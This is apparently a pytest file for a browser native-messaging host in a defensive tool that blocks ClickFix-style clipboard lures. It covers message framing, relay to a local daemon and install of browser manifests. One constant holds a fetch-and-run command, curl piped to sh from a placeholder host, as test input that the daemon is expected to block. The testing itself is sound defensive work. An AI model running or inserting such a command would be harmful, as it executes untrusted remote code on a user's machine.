"""Native-messaging host (v2.1): framing, limits, relay to the daemon, manifests."""

from __future__ import annotations

import io
import json
import struct
import subprocess
import sys
import threading
from pathlib import Path

import pytest

from refmon.browser_host import (
    FIREFOX_EXTENSION_ID,
    HOST_NAME,
    MAX_MESSAGE,
    Forwarder,
    FramingError,
    handle,
    install,
    read_message,
    serve,
    write_message,
)
from refmon.live import LiveBarrier, make_http_server

CLICKFIX = "curl -s http://bad-cdn.example.invalid/verify.sh | sh"


def frame(obj) -> bytes:
    body = json.dumps(obj).encode()
    return struct.pack("=I", len(body)) + body


def unframe_all(data: bytes) -> list[dict]:
    out, stream = [], io.BytesIO(data)
    while (msg := read_message(stream)) is not None:
        out.append(msg)
    return out


def test_round_trip_of_the_framing():
    buf = io.BytesIO()
    write_message(buf, {"a": 1, "text": "ü"})
    buf.seek(0)
    assert read_message(buf) == {"a": 1, "text": "ü"}
    assert read_message(buf) is None  # closed pipe


@pytest.mark.parametrize(
    "data",
    [
        b"\x01\x00",  # truncated header
        struct.pack("=I", MAX_MESSAGE + 1) + b"x",  # too large
        struct.pack("=I", 10) + b"abc",  # truncated body
        struct.pack("=I", 3) + b"\xff\xfe\x00",  # not UTF-8
        frame([1, 2, 3]),  # not an object
    ],
)
def test_bad_frames_end_the_host(data):
    with pytest.raises(FramingError):
        read_message(io.BytesIO(data))
    out = io.BytesIO()
    assert serve(io.BytesIO(data), out, Forwarder(Path("/nonexistent"))) == 1


def test_no_daemon_means_unavailable_never_a_judgement(tmp_path):
    fwd = Forwarder(tmp_path, port=1)  # no token, nothing listening
    ans = handle({"id": 7, "kind": "clipboard_write", "text": CLICKFIX}, fwd)
    assert ans == {"decision": "unavailable", "reason": "daemon_not_running", "action": "none",
                   "id": 7}  # fmt: skip
    (tmp_path / "api.token").write_text("t\n")
    assert handle({"kind": "navigate", "url": "https://x.example.org/"}, fwd)["decision"] == (
        "unavailable"
    )
    assert handle({"kind": "ping"}, fwd) == {"pong": True, "daemon": "unavailable"}
    assert handle({"kind": "guard", "command": "id"}, fwd) == {"error": "unknown kind"}


@pytest.fixture
def daemon(tmp_path):
    barrier = LiveBarrier(workdir=tmp_path)
    server = make_http_server(barrier, host="127.0.0.1", port=0)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield barrier, server.server_address[1]
    server.shutdown()
    server.server_close()
    thread.join(timeout=2.0)


def test_relay_to_a_running_daemon(daemon):
    barrier, port = daemon
    fwd = Forwarder(barrier.workdir, "localhost", port)
    stdin = io.BytesIO(
        frame({"id": "a", "kind": "ping"})
        + frame({"id": "b", "kind": "clipboard_write", "text": CLICKFIX, "domain": "lure.example.invalid"})
        + frame({"id": "c", "kind": "clipboard_write", "text": "ls -la", "user_selection": True})
        + frame({"id": "d", "kind": "clipboard_write", "text": "echo", "execute": True})
    )  # fmt: skip
    out = io.BytesIO()
    assert serve(stdin, out, fwd) == 0
    ping, bad, good, refused = unframe_all(out.getvalue())
    assert ping == {"pong": True, "daemon": "running", "mode": "block", "id": "a"}
    assert bad["id"] == "b" and bad["decision"] == "block" and bad["family"]["id"] == "clickfix"
    assert good["id"] == "c" and good["decision"] == "allow"
    assert refused["id"] == "d" and refused["error"].startswith("refused (400)")


def test_the_cli_host_speaks_native_messaging(daemon):
    barrier, port = daemon
    proc = subprocess.run(
        [sys.executable, "-m", "refmon.cli", "browser-host", "--port", str(port),
         "--workdir", str(barrier.workdir), "/path/to/manifest.json", FIREFOX_EXTENSION_ID],
        input=frame({"id": 1, "kind": "clipboard_write", "text": CLICKFIX}),
        capture_output=True, timeout=60, check=False,
    )  # fmt: skip
    assert proc.returncode == 0, proc.stderr
    (answer,) = unframe_all(proc.stdout)
    assert answer["decision"] == "block"
    assert CLICKFIX not in proc.stderr.decode()  # nothing raw on the diagnostics channel


def test_user_install_writes_launcher_and_firefox_manifest(tmp_path):
    home = tmp_path / "home"
    paths = install(home=home, launcher_dir=home / ".local/share/refmon", port=9999)
    launcher = home / ".local/share/refmon/refmon-browser-host"
    ff = home / ".mozilla/native-messaging-hosts" / f"{HOST_NAME}.json"
    assert paths == [launcher, ff]
    assert launcher.stat().st_mode & 0o111
    assert "'--port' '9999'" in launcher.read_text()
    doc = json.loads(ff.read_text())
    assert doc["allowed_extensions"] == [FIREFOX_EXTENSION_ID]
    assert doc["path"] == str(launcher) and doc["type"] == "stdio" and doc["name"] == HOST_NAME


def test_chromium_manifests_only_with_an_extension_id(tmp_path):
    home = tmp_path / "home"
    install(
        home=home, launcher_dir=tmp_path / "l", chromium_ids=["abcdefghijklmnopabcdefghijklmnop"]
    )
    doc = json.loads(
        (home / ".config/chromium/NativeMessagingHosts" / f"{HOST_NAME}.json").read_text()
    )
    assert doc["allowed_origins"] == ["chrome-extension://abcdefghijklmnopabcdefghijklmnop/"]
    assert (home / ".config/google-chrome/NativeMessagingHosts" / f"{HOST_NAME}.json").is_file()


def test_system_install_under_a_root(tmp_path):
    root = tmp_path / "root"
    install(home=tmp_path, launcher_dir=root / "usr/libexec/refmon", system=True, system_root=root)
    assert (root / "usr/lib/mozilla/native-messaging-hosts" / f"{HOST_NAME}.json").is_file()
    assert (root / "usr/lib64/mozilla/native-messaging-hosts" / f"{HOST_NAME}.json").is_file()
